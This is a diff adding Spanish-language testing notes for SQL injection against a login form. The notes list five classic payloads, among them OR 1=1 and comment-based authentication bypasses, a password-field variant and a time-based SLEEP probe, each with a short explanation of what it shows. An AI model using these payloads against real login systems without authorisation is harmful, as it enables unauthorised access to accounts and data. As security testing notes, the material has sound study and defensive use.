@@ -1,0 +1,60 @@
+PRUEBAS SQL INJECTION - LOGIN
+
+1.
+
+Usuario:
+admin' OR 1=1 -- 
+
+Password:
+1234
+
+Descripción:
+Permite entrar sin credenciales válidas porque la condición siempre es verdadera. / exije el @
+
+
+2. Comentario --
+
+Usuario:
+admin' -- 
+
+Password:
+loquesea
+
+Descripción:
+Ignora la verificación del password al comentar el resto de la consulta.
+
+
+3.
+
+Usuario:
+admin' OR 1=1 #
+
+Password:
+1234
+
+Descripción:
+Variante del comentario para saltar validaciones en MySQL
+
+
+4.
+
+Usuario:
+admin
+
+Password:
+' OR '1'='1
+
+Descripción:
+Permite probar si el campo contraseña también es vulnerable.
+
+
+5. 
+
+Usuario:
+admin' OR SLEEP(5) -- 
+
+Password:
+1234
+
+Descripción:
+Si la página tarda en responder, indica posible vulnerabilidad aunque no haya errores visibles.
